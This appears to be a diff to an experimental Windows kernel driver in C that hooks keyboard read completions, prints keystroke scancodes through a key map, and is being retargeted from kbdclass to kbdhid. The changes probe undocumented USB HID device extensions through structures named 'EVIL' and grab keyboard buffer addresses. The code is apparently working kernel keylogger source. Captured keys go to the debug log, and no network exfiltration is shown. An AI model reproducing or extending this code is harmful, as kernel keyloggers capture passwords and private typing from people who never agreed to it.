@@ -6,6 +6,7 @@
 #include <scancode.h>
 #include <PageTableManipulation.h>
 
+PDEVICE_OBJECT usbBaseKeyboardDeviceObject;
 PDEVICE_OBJECT usbKeyboardDeviceObject;
 VOID pauseForABit(CSHORT secondsDelay) {
 
@@ -50,8 +51,8 @@ VOID pauseForABit(CSHORT secondsDelay) {
 
 DRIVER_INITIALIZE DriverEntry;
 int numPendingIrps = 0;
-PVOID queryPvoid = NULL;
-PKEYBOARD_INPUT_DATA keyboardBuffer = NULL;
+PEVIL_LOOK queryPvoid = NULL;
+PULONG keyboardBuffer = NULL;
 PFILE_OBJECT keyboardBufferFileObject = NULL;
 
 _Use_decl_annotations_
@@ -71,9 +72,10 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 	{
 		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
 
-		if (!keyboardBuffer) {
-			keyboardBuffer = keys;
-		}
+		//if (!keyboardBuffer) {
+		//	keyboardBuffer = keys;
+		//}
+
 		// PVOID userBuffer = pIrp->UserBuffer;
 		if (!keyboardBufferFileObject) {
 			PFILE_OBJECT fileObject = pIrp->Tail.Overlay.OriginalFileObject;
@@ -82,19 +84,23 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 		if (MmIsAddressValid(keys)) {
 			if (queryPvoid) {
 				if (MmIsAddressValid(queryPvoid)) {
-					PULONG qplong = (PULONG)queryPvoid;
-					if (keys->Flags == KEY_MAKE) {
-						PUSHORT pflag = &(keys->Flags);
-						PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
-						PUSHORT make = &(keys->MakeCode);
-						PHYSICAL_ADDRESS makePA = MmGetPhysicalAddress(make);
-						KdPrint(("ScanCode: %x %c %s make [0x%x|0x%lx|0x%lx] queryPvoid [0x%lx][0x%lx][0x%lx] is [0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx].\n",
-							keys->MakeCode,
-							KeyMap[keys->MakeCode],
-							keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
-							*make, make, makePA, 
-							*qplong, qplong, &qplong, qplong[0], qplong[1], qplong[2], qplong[3], qplong[4], qplong[5], qplong[6], qplong[7]));
-					}
+
+					PUSHORT pflag = &(keys->Flags);
+					PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
+					PUSHORT make = &(keys->MakeCode);
+					PHYSICAL_ADDRESS makePA = MmGetPhysicalAddress(make);
+					KdPrint(("ScanCode: %s%x %c %s make [%s0x%x|0x%lx|0x%lx] queryPvoid [0x%lx]: [0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx]\n", 
+						keys->MakeCode > 0xf ? "" : " ", keys->MakeCode, KeyMap[keys->MakeCode],
+						keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
+						keys->MakeCode > 0xf ? "" : " ", *make, make, makePA,
+						queryPvoid,
+						queryPvoid->data0, queryPvoid->data1, queryPvoid->data2, queryPvoid->data3, queryPvoid->data4, queryPvoid->data5, queryPvoid->data6, queryPvoid->data7, 
+						queryPvoid->data8, queryPvoid->data9, queryPvoid->data10, queryPvoid->data11, queryPvoid->data12, queryPvoid->data13, queryPvoid->data14, queryPvoid->data15, 
+						queryPvoid->data16, queryPvoid->data17, queryPvoid->data18, queryPvoid->data19, queryPvoid->data20, queryPvoid->data21, queryPvoid->data22, queryPvoid->data23,
+						queryPvoid->data24, queryPvoid->data25, queryPvoid->data26, queryPvoid->data27, queryPvoid->data28, queryPvoid->data29, queryPvoid->data30, queryPvoid->data31
+						));
+
+
 				}
 				else {
 					if (keys->Flags == KEY_MAKE) {
@@ -111,6 +117,8 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 				}
 			}
 			else {
+
+
 				if (keys->Flags == KEY_MAKE) {
 					PUSHORT pflag = &(keys->Flags);
 					PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
@@ -194,14 +202,37 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
 	pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
 
 	// Now go and get the kbdclass driver
-	RtlInitUnicodeString(&kbdClassDriverName, L"\\Driver\\kbdclass");
+	//RtlInitUnicodeString(&kbdClassDriverName, L"\\Driver\\kbdclass");
+	RtlInitUnicodeString(&kbdClassDriverName, L"\\Driver\\kbdhid");
+	// TODO: try grabbing kbdhid instead.....
 	driverObjectType = ObGetObjectType(pDriverObject);
 	status = ObReferenceObjectByName(&kbdClassDriverName, OBJ_CASE_INSENSITIVE,NULL,0,driverObjectType, //(POBJECT_TYPE)IoDriverObjectType,
 	KernelMode,NULL,(PVOID*)&kbdClassDriverObject);
 
 	if (NT_SUCCESS(status)) {
 		KdPrint(("kbdClassDriverObject is [0x%lx]\n", kbdClassDriverObject));
-		usbKeyboardDeviceObject = kbdClassDriverObject->DeviceObject;
+
+		pauseForABit(10);
+
+		//usbKeyboardDeviceObject = kbdClassDriverObject->DeviceObject; 
+		usbBaseKeyboardDeviceObject = kbdClassDriverObject->DeviceObject;
+		if (usbBaseKeyboardDeviceObject) {
+			KdPrint(("usbBaseKeyboardDeviceObject is [0x%lx]\n", usbBaseKeyboardDeviceObject));
+			pauseForABit(10);
+			PUSBK_EXT usbBaseDeviceExtension = (PUSBK_EXT)usbBaseKeyboardDeviceObject->DeviceExtension;
+			KdPrint(("usbBaseDeviceExtension is [0x%lx]\n", usbBaseDeviceExtension));
+			pauseForABit(10);
+			PUSBK_DATA dataPointer = usbBaseDeviceExtension->dataPointer;
+			ULONG buffer = dataPointer->buffer;
+			PULONG bufferAddress = &dataPointer->buffer;
+			KdPrint(("bufferAddress is [0x%lx]\n", bufferAddress));
+			pauseForABit(10);
+			keyboardBuffer = bufferAddress;
+			/**/
+			return status;
+		}
+		usbKeyboardDeviceObject = usbBaseKeyboardDeviceObject->NextDevice;
+
 		// TODO: figure out do to determine is this keyboard IS a USB one
 		if (usbKeyboardDeviceObject) {
 			PHID_KBD usbDeviceExtension = usbKeyboardDeviceObject->DeviceExtension;
@@ -229,6 +260,13 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
 			KdPrint(("usbDeviceExtension pHidFuncs is: [0x%lx] [0x%lx]\n", usbDeviceExtension->pHidFuncs, MmGetPhysicalAddress(usbDeviceExtension->pHidFuncs)));
 			KdPrint(("phidpPreparsedData phidpPreparsedData is: [0x%lx] [0x%lx]\n", usbDeviceExtension->phidpPreparsedData, MmGetPhysicalAddress(usbDeviceExtension->phidpPreparsedData)));
 			KdPrint(("usbDeviceExtension pbOutputBuffer is: [0x%lx] [0x%lx]\n\n", usbDeviceExtension->pbOutputBuffer, MmGetPhysicalAddress(usbDeviceExtension->pbOutputBuffer)));
+
+			PEVIL_EXTENSION pevil = (PEVIL_EXTENSION)usbDeviceExtension;
+			KdPrint(("usbDeviceExtension [0x%lx]: [0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx][0x%lx]\n", pevil
+				, pevil->pointer0, pevil->pointer1, pevil->pointer2, pevil->pointer3, pevil->pointer4, pevil->pointer5, pevil->pointer6, pevil->pointer7, pevil->pointer8, pevil->pointer9
+				, pevil->pointer10, pevil->pointer11, pevil->pointer12, pevil->pointer13, pevil->pointer14, pevil->pointer15, pevil->pointer16, pevil->pointer17
+				));
+
 
 			//DeviceObjectExtension
 		}
